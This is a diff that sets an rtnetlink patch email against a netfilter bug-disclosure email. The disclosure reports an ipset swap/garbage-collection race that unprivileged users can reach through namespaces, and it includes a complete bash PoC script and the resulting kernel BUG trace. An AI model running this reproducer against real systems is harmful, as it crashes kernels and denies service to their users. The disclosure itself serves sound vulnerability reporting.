@@ -1,74 +1,83 @@
-Received: from mail-lf1-f50.google.com (mail-lf1-f50.google.com [209.85.167.50])
+Received: from mail-pf1-f178.google.com (mail-pf1-f178.google.com [209.85.210.178])
 	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
 	(No client certificate requested)
-	by smtp.subspace.kernel.org (Postfix) with ESMTPS id ADCA92E1F06
-	for <netdev@vger.kernel.org>; Sat,  1 Aug 2026 11:50:07 +0000 (UTC)
-Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.167.50
+	by smtp.subspace.kernel.org (Postfix) with ESMTPS id DB23735E1DA
+	for <netdev@vger.kernel.org>; Sat,  1 Aug 2026 12:10:17 +0000 (UTC)
+Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.210.178
 ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
-	t=1785585009; cv=none; b=aCU91bDsGcPTpAbI706a4IpDtGbn9gbGUhDvYve25KxnvdM6rfxVlfEfpctplOz/RvveIvry2uII+v9Ne8xjp0+zxJzS3aWeuKCSxMoYgCTXTaQ7pmCbDzOtTAL+Qy0JI1DZn0J8VAQVhBm5RX9srSIYldfme7X0Ep4GkzJ1qz4=
+	t=1785586222; cv=none; b=KTOS9ldGjZBgBLdR3Xmy/1jg/oLEWvy84bcoMziEQ3C0HyYNRtSy0P0//qPG6opRZ/zNSsHIBoAbzClVM7FeMrqSgF94Bn3Wbz3VLPK9TYDTKVR5HPuaVxvoCgwubDAcM2xQ9JcTyMlI451HGG/qPjkGii3duEs4d4P67RSDyMo=
 ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
-	s=arc-20240116; t=1785585009; c=relaxed/simple;
-	bh=GZTIKKl6UdIOedEDI8ahlfygs4bDLFNB+TldskUuKtU=;
-	h=From:To:Cc:Subject:Date:Message-ID:MIME-Version; b=uCJXa5o6N+fow6133SCnBRFGrsgXc6IlS0/tpHqhnt6TNQHEJUNwg6zuytPtzQOdbfSoyz1mC5si+JOQcK4HWh8HfeALTah4aimk64Tn0F77fp3UFTPx5tFufvjQaUmgT5h2YRNROaoPMIRHqyc7jzDVEYcqAy2YbpJkSjn6xzM=
-ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com; spf=pass smtp.mailfrom=gmail.com; dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b=ROIXq89r; arc=none smtp.client-ip=209.85.167.50
-Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com
-Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=gmail.com
+	s=arc-20240116; t=1785586222; c=relaxed/simple;
+	bh=cCmJXN58UelKcEorombe1JaRJQZLs92xTicoVCN1NDY=;
+	h=From:To:Cc:Subject:Date:Message-ID:MIME-Version; b=iDX9+Kg6GSF34a4CxqBsdJzhxpVYh7P0km1wh9KlQyYO8TsmN7WMdl0g6kyRGzf5XvwlR2QQm/u876TIGg9xQg35TeHGv6GOoe6z9cH5hg3b+wdQQq4bJXUInPGuGAyg6PbUUQ64wfHHsAJNCtQQk4YlPhIlXVg/YV0GoaFJIbQ=
+ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai; spf=pass smtp.mailfrom=nebusec.ai; dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b=LfePALwt; arc=none smtp.client-ip=209.85.210.178
+Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai
+Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=nebusec.ai
 Authentication-Results: smtp.subspace.kernel.org;
-	dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b="ROIXq89r"
-Received: by mail-lf1-f50.google.com with SMTP id 2adb3069b0e04-5b2a8e4c77eso1866184e87.1
-        for <netdev@vger.kernel.org>; Sat, 01 Aug 2026 04:50:07 -0700 (PDT)
+	dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b="LfePALwt"
+Received: by mail-pf1-f178.google.com with SMTP id d2e1a72fcca58-84e84a6c4bfso1644545b3a.1
+        for <netdev@vger.kernel.org>; Sat, 01 Aug 2026 05:10:17 -0700 (PDT)
 DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=gmail.com; s=20251104; t=1785585006; x=1786189806; darn=vger.kernel.org;
+        d=nebusec.ai; s=google; t=1785586217; x=1786191017; darn=vger.kernel.org;
         h=content-transfer-encoding:mime-version:message-id:date:subject:cc
          :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
-        bh=pQtmovRllX2fB1npPmoV718rgWYferS7+ilcZezJvdA=;
-        b=ROIXq89rAjdUFRXltGQtXLwuhvCH8UHAkyxXgD6/L5F7Cq68Y4NK/0/OAeAy5D6iC8
-         kHPBGw/tya28GnJCkT+M+ys+C5gmdcpIjPIxPl4Fd5+x+FaAiF4AKAg/AWkOTMiQp/F8
-         OAit4GbSIgXS1iXZDl0XViza29h3/YqcDTTitGEiwqGagFVFwF7cdi6UCAC2/5wB1qZh
-         VC/5Wo9wtHt74jOMuRZ18pSm8YtfagtpTfHgla1XC3n4eno3TWDroQeTsZRfBzXYpXKT
-         ZedfbMXVlAlj90kvx7emABcAaiIlFYROloAIM6tuHvmwfIGymiGaxT6LWYJT8aZ1Pj3E
-         QtWA==
+        bh=H2/NaizPBwmG+7Bm62/Ff+tQ1ikos2B9zB0xFaR0kz8=;
+        b=LfePALwtFe64RrGb6jr9xXrvSNS1hYcA2Yarrim+5cEfWRB3R+9eNBuY9LVJ7xovDg
+         aNbnofDK78wlpySb+TvkDJM7g4SXLAz8y2k9NzCErPabOTNok1bLyf22kXE8ba3w8Ft+
+         +/bJRL3V4NK0fUEsVs8zwuI9qrLVl7G+OtIewKZe2ezCEh5JkYa2fnKpPpijpXl2OWp5
+         hfksSkaZovAFYbevyKAMrImvOIepjnSRQ1pYhV+xwx+Wn1gLfErJTFoyIFl/5NzpYkUb
+         Wcp8N/ha62rxtZRVRUXgAk2CQ0qUb79TXhpHmYQOqZVsmPTxZu8E975ZNHFq5iIFRDAF
+         wf1g==
 X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=1e100.net; s=20251104; t=1785585006; x=1786189806;
+        d=1e100.net; s=20251104; t=1785586217; x=1786191017;
         h=content-transfer-encoding:mime-version:message-id:date:subject:cc
          :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
          :message-id:reply-to:content-type;
-        bh=pQtmovRllX2fB1npPmoV718rgWYferS7+ilcZezJvdA=;
-        b=GlYNZMZMYszphOKvMhwEnUFRw3rHuu4BqljUAkXZPlkrVCPVwKyr2y0ReuD4oBEN+K
-         AruMYy217SzYguMYlN1++mzYfr3LZcs/Khnjp1EuJxIMiztLIimCVl2mIMdwBOajsYB7
-         Ow1DsDZKPsxokmhiY2Qal7RSSNwxj5pGLR0sz7YXKQyHkf+D98nvbYt5dL7WMyeH8Qjp
-         ywsc57xGLulPsNViUmHuyXgXUUBPTBvu1OfvqIpbwU9i6Ifvg7GgctMRVTy3+mCg0bNV
-         4Jjkabenz++Shf/97UP1cvpkkrdKQK05yG9PUnZ3aHZPEeKbI7c3NFB8yej34iDawiWJ
-         thPg==
-X-Gm-Message-State: AOJu0YxGzcQ+XiZ/cGwyEPd10VZCEFy/Y+zm+l7MVgmlruNu6R8RqUGd
-	Pk77+W4UAKf3ZQZ0SfDMnT1NcG6oHFKKEC+xu3G9N9yi5ySZFgEbV29ev1uvXw==
-X-Gm-Gg: AR+sD11R+WGYPDhR4j5z7umMlxczm5qkuTEn7I38Usvrm60MuBSQ/+ts2WDbrzOgl2R
-	T4KtMMA83tciZR7BQOTGuUz/XJcR4b5gTvud59aw4uSkZeHkbqWKEDC13DPCL6pOVeVF6OZGROE
-	xmr95Qjh2SkiXj2JF1/R3JsaXPNg/quYb8UoSuUg/OIFcjBxp1518qEDCIsn+qB78eqXRygwLM6
-	UiSjg0jEHaIwzJsSGLyFH06Aw4HZfJKT/h2+crT16uNnet/fG8hUqEGW0fX4u8wC35kuSNzg29d
-	Q4rqbMGTqDJYXZZgEeSmvwxsFG2YjMqh5l/rQkVNTS1mHDKzzALbhkIC2jgQlGcfkxncsxUp5OB
-	f4yR55VH0qqObgXGcbj/N9CIKvZX60ddgIcmyPhEwyabVqLAOMoNMgjW4CjXDaJfHE80KhvsNMI
-	3qcGqKbyqKfJaYftjz4lEMvg+RFuMFtuL9XVD07F8yB7m830WHu6Tt2ybQbxBsIYJ/qeXkMq6SU
-	6Dsx3aLrkGfTuNGqb4PE+72TCwuQtiMDpkvh4cuIqnSUOT2P+/UcNjgjkSA2O564mkw
-X-Received: by 2002:a05:6512:3f8:b0:5ae:b75e:454d with SMTP id 2adb3069b0e04-5b2e4f80129mr468437e87.45.1785585005574;
-        Sat, 01 Aug 2026 04:50:05 -0700 (PDT)
-Received: from localhost.localdomain (46-138-176-102.dynamic.spd-mgts.ru. [46.138.176.102])
-        by smtp.gmail.com with ESMTPSA id 2adb3069b0e04-5b2e2441e71sm886919e87.41.2026.08.01.04.50.04
+        bh=H2/NaizPBwmG+7Bm62/Ff+tQ1ikos2B9zB0xFaR0kz8=;
+        b=gtIq2zuwdBvovM0e7qa6pDK2/Loe81U4Z5/l/XGodW7IQc4GK4mruidVdRwM0x3zbm
+         ofK9DddWn6oZWdbdEmVvXCYvdSp2NW6fSlWlr2DRI1wU94QipWrRW1MujHPEkdmMT1Fe
+         e5rVEObsDSiMZk7nBMQ3ofWexW/QFAqsdfnjsjBAh3gUR0y/BnFEqxyEqwiyogGl6B6s
+         AEdmtYQiwBXUWTUT0MxXeQvaj8kioAvOUB/OSCVkFFxFARi6dAOPpf662kB5wxxuX9tf
+         4JrvdGodYXXXToHck51JIBX1elkTWmbv+4ZKOmn791QNjjqLLE5dn6LB1M7/EESLqP1M
+         /3YQ==
+X-Forwarded-Encrypted: i=1; AHgh+Rqp92n2Bxxfvrx82F+SBbeKG/45I0gAgoCGJgTAZHfBvFyl7kA/Npiql8wZvzYILIQn3TUamH4=@vger.kernel.org
+X-Gm-Message-State: AOJu0YyIhHEzy2Xn6SBlCs8hcmXznfeV4hI2zewYtmeYwXqUqeG8Z1R1
+	b1Nc+2l4e2boESx4942t/3JIdVJRHR270vmohahRGjC3K9IXboqgWd/cSmiqxZID3HOb
+X-Gm-Gg: AR+sD111ve2PArpSxY07ijVUWwzw2gwTU2FdHikbGIcLC/fR/5oD6XzKMWWuFBU73um
+	60dGpZc4C/CI9iVNejnHbsSIIAtpvCk9EAX5EpXVxvgAGdxtAJbAHHOIaN403+0OtjRxHv7MH9O
+	Gsc4pjehgLb9Rjq0mCYavjMJ5zgjLoCQ522uj9XYqOs8W44bneS1AX3OF2u20y9kmqPWxHFOBPo
+	IDJTaZ4i2N3XxjBPaXAxqqgKc6nb5hQjzbKzRZTv7LvetjYHpN7rtwQRMZWX33X1CCw3eRblTxG
+	SoTNRZnYq6bTWf1KYnTAkceU8/HfPP5/IKV6qXTDKFu7GH/W9rquKut+FM1pN3qRJso4n38aJUU
+	ZLxiC9LyvnttRhJSFwDeBW2ETJQZ1WQUWHv/hoqy7gE7ieNZz7FE/C05JBOV1yuuql4f6THaxE4
+	YoVl/9lrDCFZoA0QMkbXO1GlQkbKKfVru2SKqTQVygaEF14rc8imMsiOrSfj++Hmm3qgk8RC4+2
+	A==
+X-Received: by 2002:a05:6a00:300f:b0:847:888f:9b0f with SMTP id d2e1a72fcca58-84ee486243amr2784779b3a.15.1785586216625;
+        Sat, 01 Aug 2026 05:10:16 -0700 (PDT)
+Received: from Roxy.localdomain ([202.8.9.242])
+        by smtp.gmail.com with ESMTPSA id d2e1a72fcca58-84edc2d45e5sm1580587b3a.42.2026.08.01.05.10.09
         (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
-        Sat, 01 Aug 2026 04:50:05 -0700 (PDT)
-From: Artem Lytkin <iprintercanon@gmail.com>
-To: netdev@vger.kernel.org
-Cc: kuba@kernel.org,
+        Sat, 01 Aug 2026 05:10:15 -0700 (PDT)
+From: Zhiling Zou <zhilinz@nebusec.ai>
+To: netfilter-devel@vger.kernel.org,
+	netdev@vger.kernel.org
+Cc: pablo@netfilter.org,
+	fw@strlen.de,
+	phil@nwl.cc,
+	kadlec@netfilter.org,
+	den@openvz.org,
 	davem@davemloft.net,
 	edumazet@google.com,
+	kuba@kernel.org,
 	pabeni@redhat.com,
 	horms@kernel.org,
-	donald.hunter@gmail.com,
-	jacob.e.keller@intel.com,
-	linux-kernel@vger.kernel.org
-Subject: [PATCH net-next v3] rtnetlink: cap IFLA_VFINFO_LIST at a documented number of VFs
-Date: Sat,  1 Aug 2026 14:49:44 +0300
-Message-ID: <20260801114944.115272-1-iprintercanon@gmail.com>
+	xmei5@asu.edu,
+	kees@kernel.org,
+	sbrivio@redhat.com,
+	vega@nebusec.ai,
+	zhilinz@nebusec.ai
+Subject: [PATCH nf 0/1] netfilter: ipset: serialize kernel-side put-byindex with swap
+Date: Sat,  1 Aug 2026 20:10:01 +0800
+Message-ID: <cover.1785583673.git.zhilinz@nebusec.ai>
 X-Mailer: git-send-email 2.43.0
 Precedence: bulk
 X-Mailing-List: netdev@vger.kernel.org
@@ -78,142 +87,367 @@ List-Unsubscribe: <mailto:netdev+unsubscribe@vger.kernel.org>
 MIME-Version: 1.0
 Content-Transfer-Encoding: 8bit
 
-rtnl_fill_vf() emits one IFLA_VF_INFO per VF into the IFLA_VFINFO_LIST
-nest and closes it with nla_nest_end(), which stores the accumulated
-length into nla_len. That field is a u16, so a nest larger than 65535
-bytes is written truncated modulo 65536. The list dates back to commit
-c02db8c6290b ("rtnetlink: make SR-IOV VF interface symmetric") in 2010
-and has never been able to describe an arbitrary number of VFs; nothing
-regressed, the encoding simply cannot represent it.
+Hi Linux kernel maintainers,
 
-Nothing catches it on the way. if_nlmsg_size() adds rtnl_vfinfo_size()
-for every VF, so the skb really is large enough and none of the nla_put()
-calls fails. Userspace then walks the message with RTA_NEXT(), which
-advances by the stored length, so parsing resumes inside VF payload and
-the attributes after the nest are read out of VF data: IFLA_VF_PORTS,
-IFLA_XDP, IFLA_LINKINFO, IFLA_PERM_ADDRESS, IFLA_AF_SPEC. iproute2
-prints "!!!Deficit" and strictly validating parsers reject the message.
-On CONFIG_DEBUG_NET kernels nla_nest_end() also splats, via the
-DEBUG_NET_WARN_ON_ONCE() added in commit ff205bf8c554 ("netlink: add one
-debug check in nla_nest_end()").
+We found and validated an issue in net/netfilter/ipset/ip_set_core.c and
+net/netfilter/ipset/ip_set_list_set.c. The bug is reachable by a non-root
+user via user and net namespaces.
 
-Where the wrap falls depends on what was asked for and on the host. A VF
-costs 196 bytes, 296 with statistics, 236 with GUIDs and 336 with both,
-and on a kernel without CONFIG_HAVE_EFFICIENT_UNALIGNED_ACCESS the
-statistics carry a padding attribute each and cost 32 bytes more, making
-those two 328 and 368. The nest therefore overflows somewhere between 179
-and 335 VFs, and ice allows 256 per PF (ICE_MAX_SRIOV_VFS), which reaches
-it. Statistics are included unless the request sets
-RTEXT_FILTER_SKIP_STATS, so the common case is the one that wraps first.
+We've prepared a minimal fix locally, and it should not affect normal
+functionality.
 
-A limit that moves with the requested attribute set and with the host's
-alignment requirements is not something userspace can be told, so use
-fixed numbers instead and document them as what the interface supports:
-256 VFs, or 128 when statistics are included. Both stay well inside
-U16_MAX even in the largest per-VF encoding, at 60416 and 47104 bytes
-respectively. rtnl_vfinfo_cap() applies the cap in both places, so
-rtnl_vfinfo_size() does not size the skb for VFs that will not be
-emitted.
+We will provide detailed information about the bug in this email, along
+with a PoC to trigger it.
 
-A device with more VFs than the limit reports a shorter
-IFLA_VFINFO_LIST. IFLA_NUM_VF keeps carrying the real count, and
-everything after the nest stays parsable, which is the part that is
-broken today. An empty nest is already emitted for a PF with no VFs, so a
-list shorter than IFLA_NUM_VF is not a new encoding.
+---- details below ----
 
-Returning -EMSGSIZE instead, which is what nla_nest_end_safe() would
-give, is not an option here: a nest that does not fit in a u16 will not
-fit in a retried skb either, so it would turn a link dump on such a
-device into a hard failure.
+Bug details:
 
-The other large nests in rtnl_fill_ifinfo() were audited and cannot
-overflow. IFLA_AF_SPEC is bounded by a handful of address families at
-about a kilobyte each, and IFLA_VF_PORTS would need more than 560 VFs,
-which no in-tree driver allows.
+list:set garbage collection removes expired member sets through
+ip_set_put_byindex(), which resolves inst->ip_set_list[index] before
+taking ip_set_ref_lock. ip_set_swap() swaps the indexed set pointers and
+their corresponding refcounts while holding that same lock.
 
-Reported-by: Jacob Keller <jacob.e.keller@intel.com>
-Link: https://lore.kernel.org/netdev/16b289f6-b025-5dd3-443d-92d4c167e79c@intel.com/
-Assisted-by: Claude:claude-fable-5
-Signed-off-by: Artem Lytkin <iprintercanon@gmail.com>
----
-v3:
- - dropped the two defines for the literals and folded the min() into the
-   helper, which takes the real VF count now and is renamed
-   rtnl_vfinfo_cap(); the comment describes the helper (Jakub)
- - changelog names the commit the list came from, without a Fixes: tag
-   (Jacob)
- - fixed the citation for the nla_nest_end() debug check, which came from
-   ff205bf8c554 and not from the nla_nest_end_safe() commit
-v2: https://lore.kernel.org/netdev/20260730090700.65867-1-iprintercanon@gmail.com/
-v1: https://lore.kernel.org/netdev/20260725132236.88318-1-iprintercanon@gmail.com/
+If garbage collection fetches the old pointer for an index and then loses
+the lock race to ip_set_swap(), it decrements the pre-swap object after
+its refcount has already been transferred away. This can hit
+BUG_ON(set->ref == 0) when the peer set had no references, or otherwise
+under-reference a live set while leaving a phantom reference on the other
+set.
 
- Documentation/netlink/specs/rt-link.yaml |  5 +++++
- net/core/rtnetlink.c                     | 22 +++++++++++++++++++++-
- 2 files changed, 26 insertions(+), 1 deletion(-)
+Reproducer:
 
-diff --git a/Documentation/netlink/specs/rt-link.yaml b/Documentation/netlink/specs/rt-link.yaml
-index 68c26a70bb649..b80c2ac3ac311 100644
---- a/Documentation/netlink/specs/rt-link.yaml
-+++ b/Documentation/netlink/specs/rt-link.yaml
-@@ -928,6 +928,11 @@ attribute-sets:
-         name: vfinfo-list
-         type: nest
-         nested-attributes: vfinfo-list-attrs
-+        doc: |
-+          Per-VF details. The list holds at most 256 VFs, or 128 when
-+          statistics are included, because it is one attribute and has to fit
-+          in a u16 length. A device with more VFs than that reports a
-+          truncated list; num-vf still carries the real count.
-       -
-         name: stats64
-         type: binary
-diff --git a/net/core/rtnetlink.c b/net/core/rtnetlink.c
-index 31c65a545a107..81c5a6104dea1 100644
---- a/net/core/rtnetlink.c
-+++ b/net/core/rtnetlink.c
-@@ -1174,12 +1174,27 @@ static void copy_rtnl_link_stats(struct rtnl_link_stats *a,
- 	a->rx_nohandler = b->rx_nohandler;
- }
- 
-+/* Cap the number of VFs that IFLA_VFINFO_LIST describes. The nest is one
-+ * netlink attribute, so everything inside it has to fit in the u16 nla_len.
-+ * The cap is a fixed number rather than whatever happens to fit, so that the
-+ * limit is a property of the interface instead of one of the requested
-+ * attribute set and the host's alignment requirements. The largest per-VF
-+ * encoding is 368 bytes with statistics and GUIDs and 236 bytes without
-+ * statistics, so both values keep the nest well inside U16_MAX.
-+ */
-+static int rtnl_vfinfo_cap(int num_vfs, u32 ext_filter_mask)
-+{
-+	return min(num_vfs,
-+		   ext_filter_mask & RTEXT_FILTER_SKIP_STATS ? 256 : 128);
-+}
-+
- /* All VF info */
- static inline int rtnl_vfinfo_size(const struct net_device *dev,
- 				   u32 ext_filter_mask)
- {
- 	if (dev->dev.parent && (ext_filter_mask & RTEXT_FILTER_VF)) {
--		int num_vfs = dev_num_vf(dev->dev.parent);
-+		int num_vfs = rtnl_vfinfo_cap(dev_num_vf(dev->dev.parent),
-+					      ext_filter_mask);
- 		size_t size = nla_total_size(0);
- 		size += num_vfs *
- 			(nla_total_size(0) +
-@@ -1717,6 +1732,11 @@ static noinline_for_stack int rtnl_fill_vf(struct sk_buff *skb,
- 	if (!vfinfo)
- 		return -EMSGSIZE;
- 
-+	/* IFLA_NUM_VF above stays the device's VF count; the list itself is
-+	 * capped so that its length cannot overflow nla_len.
-+	 */
-+	num_vfs = rtnl_vfinfo_cap(num_vfs, ext_filter_mask);
-+
- 	for (i = 0; i < num_vfs; i++) {
- 		if (rtnl_fill_vfinfo(skb, dev, i, ext_filter_mask)) {
- 			nla_nest_cancel(skb, vfinfo);
+    chmod +x ./poc.sh
+    unshare -Urn ./poc.sh
 
-base-commit: 69963a0678a347d57c4ac8b16939dba216eb95ce
+We run the PoC in a 2 vCPU, 2 GB RAM x86 QEMU environment.
+
+------BEGIN poc.sh------
+
+#!/bin/bash
+set -euo pipefail
+
+PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+IPSET=${IPSET:-$(command -v ipset)}
+
+LISTS=${LISTS:-200}
+SWAP_THREADS=${SWAP_THREADS:-4}
+SWAP_BATCH=${SWAP_BATCH:-2000}
+LIST_TIMEOUT=${LIST_TIMEOUT:-6}
+ENTRY_TIMEOUT=${ENTRY_TIMEOUT:-1}
+DURATION=${DURATION:-30}
+WORKDIR=${WORKDIR:-/tmp/ipset-race}
+
+cleanup() {
+	set +e
+	if [ -n "${pids:-}" ]; then
+		kill $pids 2>/dev/null
+		wait $pids 2>/dev/null
+	fi
+	"$IPSET" destroy >/dev/null 2>&1 || true
+}
+
+trap cleanup EXIT INT TERM
+
+mkdir -p "$WORKDIR"
+"$IPSET" destroy >/dev/null 2>&1 || true
+
+{
+	echo "create a hash:ip family inet hashsize 64 maxelem 64"
+	echo "create b hash:ip family inet hashsize 64 maxelem 64"
+	for i in $(seq 0 $((LISTS - 1))); do
+		echo "create l$i list:set size 8 timeout $LIST_TIMEOUT"
+	done
+	for i in $(seq 0 $((LISTS - 1))); do
+		echo "add l$i a timeout $ENTRY_TIMEOUT"
+	done
+} > "$WORKDIR/setup.ipset"
+
+"$IPSET" restore < "$WORKDIR/setup.ipset"
+
+for _ in $(seq 1 "$SWAP_BATCH"); do
+	echo "swap a b"
+done > "$WORKDIR/swaps.ipset"
+
+pids=""
+for _ in $(seq 1 "$SWAP_THREADS"); do
+	(
+		while :; do
+			"$IPSET" restore < "$WORKDIR/swaps.ipset" >/dev/null 2>&1
+		done
+	) &
+	pids="$pids $!"
+done
+
+sleep "$DURATION"
+
+------END poc.sh--------
+
+----BEGIN crash log----
+
+kernel BUG at net/netfilter/ipset/ip_set_core.c:685!
+[  193.252485] Oops: invalid opcode: 0000 [#1] SMP NOPTI
+[  193.252953] CPU: 1 UID: 1028 PID: 1430 Comm: ipset Not tainted 6.12.95 #1
+[  193.253454] Hardware name: QEMU Ubuntu 24.04 PC v2 (i440FX + PIIX, arch_caps fix, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
+[  193.254360] RIP: 0010:ip_set_put_byindex (build/../include/linux/rcupdate.h:839 build/../net/netfilter/ipset/ip_set_core.c:857 build/../net/netfilter/ipset/ip_set_core.c:869)
+[  193.254789] Code: c7 c7 d0 a4 74 85 e8 da de 31 00 8b 43 34 85 c0 74 18 83 e8 01 48 c7 c7 d0 a4 74 85 89 43 34 e8 d1 dc 31 00 5b e9 06 09 59 00 <0f> 0b 90 0f 1f 84 00 00 00 00 00 90 90 90 90 90 90 90 90 90 90 90
+All code
+========
+   0:	c7 c7 d0 a4 74 85    	mov    $0x8574a4d0,%edi
+   6:	e8 da de 31 00       	call   0x31dee5
+   b:	8b 43 34             	mov    0x34(%rbx),%eax
+   e:	85 c0                	test   %eax,%eax
+  10:	74 18                	je     0x2a
+  12:	83 e8 01             	sub    $0x1,%eax
+  15:	48 c7 c7 d0 a4 74 85 	mov    $0xffffffff8574a4d0,%rdi
+  1c:	89 43 34             	mov    %eax,0x34(%rbx)
+  1f:	e8 d1 dc 31 00       	call   0x31dcf5
+  24:	5b                   	pop    %rbx
+  25:	e9 06 09 59 00       	jmp    0x590930
+  2a:*	0f 0b                	ud2		<-- trapping instruction
+  2c:	90                   	nop
+  2d:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
+  34:	00 
+  35:	90                   	nop
+  36:	90                   	nop
+  37:	90                   	nop
+  38:	90                   	nop
+  39:	90                   	nop
+  3a:	90                   	nop
+  3b:	90                   	nop
+  3c:	90                   	nop
+  3d:	90                   	nop
+  3e:	90                   	nop
+  3f:	90                   	nop
+
+Code starting with the faulting instruction
+===========================================
+   0:	0f 0b                	ud2
+   2:	90                   	nop
+   3:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
+   a:	00 
+   b:	90                   	nop
+   c:	90                   	nop
+   d:	90                   	nop
+   e:	90                   	nop
+   f:	90                   	nop
+  10:	90                   	nop
+  11:	90                   	nop
+  12:	90                   	nop
+  13:	90                   	nop
+  14:	90                   	nop
+  15:	90                   	nop
+[  193.256104] RSP: 0018:ffffc90000108e30 EFLAGS: 00010246
+[  193.256431] RAX: 0000000000000000 RBX: ffff8881148e8040 RCX: ffff888110c454c0
+[  193.256868] RDX: 00000000000000ff RSI: 0000000000000000 RDI: ffffffff8574a4d4
+[  193.257317] RBP: ffff888110c45480 R08: ffff88813bca33e8 R09: ffffc90000108ee8
+[  193.257776] R10: 00000000000000bc R11: 00000000000007fc R12: ffff888110c454c0
+[  193.258226] R13: 0000000000000000 R14: ffffc90000108ee0 R15: ffffc90000108ee0
+[  193.258675] FS:  00007ab935d5f180(0000) GS:ffff88813bc80000(0000) knlGS:0000000000000000
+[  193.259166] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
+[  193.259515] CR2: 00007ab935d64000 CR3: 0000000105ae4004 CR4: 0000000000770ef0
+[  193.259952] PKRU: 55555554
+[  193.260122] Call Trace:
+[  193.260279]  <IRQ>
+[  193.260411]  list_set_del (build/../net/netfilter/ipset/ip_set_list_set.c:157)
+[  193.260641]  set_cleanup_entries (build/../net/netfilter/ipset/ip_set_list_set.c:176)
+[  193.260898]  list_set_gc (build/../net/netfilter/ipset/ip_set_list_set.c:575)
+[  193.261146]  ? __pfx_list_set_gc (build/../net/netfilter/ipset/ip_set_list_set.c:179)
+[  193.261400]  call_timer_fn (build/../kernel/time/timer.c:1725)
+[  193.261696]  __run_timers (build/../kernel/time/timer.c:2355 (discriminator 1))
+[  193.262016]  run_timer_softirq (build/../include/trace/events/timer.h:92)
+[  193.262345]  handle_softirqs (build/../kernel/softirq.c:596 (discriminator 10))
+[  193.262684]  __irq_exit_rcu (build/../arch/x86/include/asm/bitops.h:202 (discriminator 1) build/../arch/x86/include/asm/bitops.h:232 (discriminator 1) build/../include/linux/thread_info.h:199 (discriminator 1) build/../include/linux/thread_info.h:215 (discriminator 1) build/../include/linux/sched.h:2283 (discriminator 1) build/../kernel/softirq.c:695 (discriminator 1) build/../kernel/softirq.c:742 (discriminator 1))
+[  193.263001]  sysvec_apic_timer_interrupt (build/../arch/x86/kernel/apic/apic.c:1061 (discriminator 17) build/../arch/x86/kernel/apic/apic.c:1061 (discriminator 17))
+[  193.263406]  </IRQ>
+[  193.263584]  <TASK>
+[  193.263765]  asm_sysvec_apic_timer_interrupt (build/../arch/x86/include/asm/idtentry.h:697)
+[  193.264192] RIP: 0010:_raw_spin_unlock_irqrestore (build/../include/linux/spinlock_api_smp.h:177 build/../kernel/locking/spinlock.c:198)
+[  193.264645] Code: 90 90 90 90 90 90 90 90 90 90 90 90 90 f3 0f 1e fa 0f 1f 44 00 00 e8 02 06 00 00 90 f7 c6 00 02 00 00 74 06 fb 0f 1f 44 00 00 <e9> 39 2e 27 00 66 66 2e 0f 1f 84 00 00 00 00 00 0f 1f 00 90 90 90
+All code
+========
+   0:	90                   	nop
+   1:	90                   	nop
+   2:	90                   	nop
+   3:	90                   	nop
+   4:	90                   	nop
+   5:	90                   	nop
+   6:	90                   	nop
+   7:	90                   	nop
+   8:	90                   	nop
+   9:	90                   	nop
+   a:	90                   	nop
+   b:	90                   	nop
+   c:	90                   	nop
+   d:	f3 0f 1e fa          	endbr64
+  11:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
+  16:	e8 02 06 00 00       	call   0x61d
+  1b:	90                   	nop
+  1c:	f7 c6 00 02 00 00    	test   $0x200,%esi
+  22:	74 06                	je     0x2a
+  24:	fb                   	sti
+  25:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
+  2a:*	e9 39 2e 27 00       	jmp    0x272e68		<-- trapping instruction
+  2f:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
+  36:	00 00 00 00 
+  3a:	0f 1f 00             	nopl   (%rax)
+  3d:	90                   	nop
+  3e:	90                   	nop
+  3f:	90                   	nop
+
+Code starting with the faulting instruction
+===========================================
+   0:	e9 39 2e 27 00       	jmp    0x272e3e
+   5:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
+   c:	00 00 00 00 
+  10:	0f 1f 00             	nopl   (%rax)
+  13:	90                   	nop
+  14:	90                   	nop
+  15:	90                   	nop
+[  193.266138] RSP: 0018:ffffc9000182fa00 EFLAGS: 00000206
+[  193.266553] RAX: 0000000000000001 RBX: ffff888100b5a040 RCX: 0000000000000000
+[  193.267129] RDX: 0000000000000008 RSI: 0000000000000282 RDI: ffff888100aa6a40
+[  193.267698] RBP: ffffc9000182fac0 R08: 0101010101010101 R09: ffff888105d42d00
+[  193.268287] R10: ffff888105d42a40 R11: 000000000001a001 R12: ffffea0004175000
